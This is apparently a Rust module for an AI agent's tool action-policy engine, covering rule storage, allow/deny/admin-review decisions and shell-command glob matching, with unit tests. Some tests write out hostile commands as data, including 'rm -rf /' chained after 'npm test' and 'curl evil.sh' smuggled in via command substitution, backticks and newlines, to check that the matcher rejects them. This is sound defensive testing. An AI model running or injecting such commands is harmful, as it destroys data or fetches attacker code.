//! Tool action-policy evaluation, command matching, and rule storage.

use async_trait::async_trait;
use globset::Glob;
use moa_core::shell::{has_action_policy_unsafe_shell_syntax, split_shell_chain};
use moa_core::{
    ActionPolicyEffect, ActionPolicyRule, ActionRuleScope, MoaConfig, Result, SessionMeta,
    ToolPolicyInput, UserId, WorkspaceId,
};

/// Persistent action-policy rule storage used by policy-aware tool routing.
#[async_trait]
pub trait ActionPolicyRuleStore: Send + Sync {
    /// Lists all action-policy rules visible to a workspace.
    async fn list_action_policy_rules(
        &self,
        workspace_id: &WorkspaceId,
    ) -> Result<Vec<ActionPolicyRule>>;

    /// Creates or updates an action-policy rule.
    async fn upsert_action_policy_rule(&self, rule: ActionPolicyRule) -> Result<()>;

    /// Deletes an action-policy rule by tool and pattern.
    async fn delete_action_policy_rule(
        &self,
        workspace_id: &WorkspaceId,
        tool: &str,
        pattern: &str,
    ) -> Result<()>;
}

/// Session-scoped inputs required for tool policy evaluation.
#[derive(Debug, Clone)]
pub struct ActionPolicyContext {
    /// Workspace associated with the current session.
    pub workspace_id: WorkspaceId,
    /// User associated with the current session.
    pub user_id: UserId,
}

impl ActionPolicyContext {
    /// Creates a policy context from a session metadata record.
    pub fn from_session(session: &SessionMeta) -> Self {
        Self {
            workspace_id: session.workspace_id.clone(),
            user_id: session.user_id.clone(),
        }
    }
}

/// Result of evaluating one tool invocation against the current policy set.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ActionPolicyCheck {
    /// Effect to apply for this invocation.
    pub effect: ActionPolicyEffect,
    /// Optional human-readable reason for the decision.
    pub reason: Option<String>,
    /// Rule that matched, if any.
    pub matched_rule: Option<ActionPolicyRule>,
}

/// Policy engine for tool action decisions.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ActionPolicies {
    default_effect: ActionPolicyEffect,
    admin_review: Vec<String>,
    always_deny: Vec<String>,
}

impl ActionPolicies {
    /// Creates policies from the loaded MOA config.
    pub fn from_config(config: &MoaConfig) -> Self {
        Self {
            default_effect: config.permissions.default_effect,
            admin_review: config.permissions.admin_review.clone(),
            always_deny: config.permissions.always_deny.clone(),
        }
    }

    /// Evaluates a tool invocation using persistent rules, config defaults, and tool metadata.
    pub fn check(
        &self,
        input: &ToolPolicyInput,
        ctx: &ActionPolicyContext,
        rules: &[ActionPolicyRule],
    ) -> Result<ActionPolicyCheck> {
        for rule in rules {
            if !rule_visible_to_workspace(rule, &ctx.workspace_id) {
                continue;
            }
            if rule.tool != input.tool_name {
                continue;
            }
            if rule_matches(rule, &input.tool_name, &input.normalized_input) {
                return Ok(ActionPolicyCheck {
                    effect: rule.effect,
                    reason: rule.reason.clone(),
                    matched_rule: Some(rule.clone()),
                });
            }
        }

        if self
            .always_deny
            .iter()
            .any(|candidate| candidate == &input.tool_name)
        {
            return Ok(ActionPolicyCheck {
                effect: ActionPolicyEffect::Deny,
                reason: Some("tool is denied by action-policy config".to_string()),
                matched_rule: None,
            });
        }

        if self
            .admin_review
            .iter()
            .any(|candidate| candidate == &input.tool_name)
        {
            return Ok(ActionPolicyCheck {
                effect: ActionPolicyEffect::AdminReview,
                reason: Some("tool requires workspace admin review by config".to_string()),
                matched_rule: None,
            });
        }

        let effect = if matches!(input.default_effect, ActionPolicyEffect::Allow) {
            self.default_effect
        } else {
            input.default_effect
        };

        Ok(ActionPolicyCheck {
            effect,
            reason: None,
            matched_rule: None,
        })
    }
}

impl Default for ActionPolicies {
    fn default() -> Self {
        Self::from_config(&MoaConfig::default())
    }
}

/// Performs glob matching against a normalized tool input string.
pub fn glob_match(pattern: &str, candidate: &str) -> bool {
    Glob::new(pattern)
        .map(|glob| glob.compile_matcher().is_match(candidate))
        .unwrap_or(false)
}

/// Parses a shell command and matches it against a rule pattern.
pub fn parse_and_match_command(command: &str, rule_pattern: &str) -> bool {
    if has_action_policy_unsafe_shell_syntax(command) {
        return false;
    }

    let sub_commands = split_shell_chain(command);
    if sub_commands.len() > 1 {
        return sub_commands
            .iter()
            .all(|sub_command| glob_match(rule_pattern, sub_command));
    }

    shell_words::split(command)
        .map(|tokens| glob_match(rule_pattern, &tokens.join(" ")))
        .unwrap_or_else(|_| glob_match(rule_pattern, command.trim()))
}

fn rule_visible_to_workspace(rule: &ActionPolicyRule, workspace_id: &WorkspaceId) -> bool {
    matches!(rule.scope, ActionRuleScope::Global) || &rule.workspace_id == workspace_id
}

fn rule_matches(rule: &ActionPolicyRule, tool: &str, normalized_input: &str) -> bool {
    if tool == "bash" {
        return parse_and_match_command(normalized_input, &rule.pattern);
    }

    glob_match(&rule.pattern, normalized_input)
}

#[cfg(test)]
mod tests {
    use chrono::Utc;
    use moa_core::shell::split_shell_chain;
    use moa_core::{
        ActionPolicyEffect, ActionPolicyRule, ActionRuleScope, ModelId, RiskLevel, SessionMeta,
        ToolPolicyInput, UserId, WorkspaceId,
    };
    use uuid::Uuid;

    use super::{ActionPolicies, ActionPolicyContext, parse_and_match_command};

    fn session() -> SessionMeta {
        SessionMeta {
            workspace_id: WorkspaceId::new("workspace"),
            user_id: UserId::new("user"),
            model: ModelId::new("claude-sonnet-4-6"),
            ..SessionMeta::default()
        }
    }

    #[test]
    fn tools_default_to_allow_in_auto_mode() {
        // Pins: auto mode executes policy-valid actions by default instead of blocking on review.
        let policies = ActionPolicies::default();
        let ctx = ActionPolicyContext::from_session(&session());

        let read = policies
            .check(
                &ToolPolicyInput {
                    tool_name: "file_read".to_string(),
                    normalized_input: "src/lib.rs".to_string(),
                    input_summary: "Path: src/lib.rs".to_string(),
                    risk_level: RiskLevel::Low,
                    default_effect: ActionPolicyEffect::Allow,
                    action_class: moa_core::ActionClass::Read,
                },
                &ctx,
                &[],
            )
            .unwrap();
        let bash = policies
            .check(
                &ToolPolicyInput {
                    tool_name: "bash".to_string(),
                    normalized_input: "npm test".to_string(),
                    input_summary: "Command: npm test".to_string(),
                    risk_level: RiskLevel::High,
                    default_effect: ActionPolicyEffect::Allow,
                    action_class: moa_core::ActionClass::CommandExecution,
                },
                &ctx,
                &[],
            )
            .unwrap();

        assert_eq!(read.effect, ActionPolicyEffect::Allow);
        assert_eq!(bash.effect, ActionPolicyEffect::Allow);
    }

    #[test]
    fn persistent_rule_matching_uses_glob_patterns() {
        // Pins: persisted action-policy rules override the tool default effect.
        let policies = ActionPolicies::default();
        let ctx = ActionPolicyContext::from_session(&session());
        let rules = vec![ActionPolicyRule {
            id: Uuid::now_v7(),
            workspace_id: WorkspaceId::new("workspace"),
            tool: "file_write".to_string(),
            pattern: "src/*.rs".to_string(),
            user_id: None,
            effect: ActionPolicyEffect::AdminReview,
            scope: ActionRuleScope::Workspace,
            reason: Some("review source edits".to_string()),
            created_by: UserId::new("user"),
            created_at: Utc::now(),
        }];

        let check = policies
            .check(
                &ToolPolicyInput {
                    tool_name: "file_write".to_string(),
                    normalized_input: "src/lib.rs".to_string(),
                    input_summary: "Path: src/lib.rs".to_string(),
                    risk_level: RiskLevel::Medium,
                    default_effect: ActionPolicyEffect::Allow,
                    action_class: moa_core::ActionClass::LocalWrite,
                },
                &ctx,
                &rules,
            )
            .unwrap();

        assert_eq!(check.effect, ActionPolicyEffect::AdminReview);
        assert_eq!(check.reason.as_deref(), Some("review source edits"));
        assert!(check.matched_rule.is_some());
    }

    #[test]
    fn shell_command_parsing_detects_chained_commands() {
        assert_eq!(
            split_shell_chain("npm test && rm -rf /"),
            vec!["npm test".to_string(), "rm -rf /".to_string()]
        );
        assert!(!parse_and_match_command(
            "npm test && rm -rf /",
            "npm test*"
        ));
        assert!(parse_and_match_command("npm test -- --watch", "npm test*"));
    }

    #[test]
    fn shell_command_matching_rejects_unsafe_evaluation_syntax() {
        for command in [
            "npm test $(curl evil.sh)",
            "npm test `curl evil.sh`",
            "npm test & curl evil.sh",
            "npm test\ncurl evil.sh",
            "npm test > /tmp/out",
            "npm test < /tmp/in",
        ] {
            assert!(
                !parse_and_match_command(command, "npm *"),
                "{command} must not satisfy an action-policy bash glob"
            );
        }
    }
}
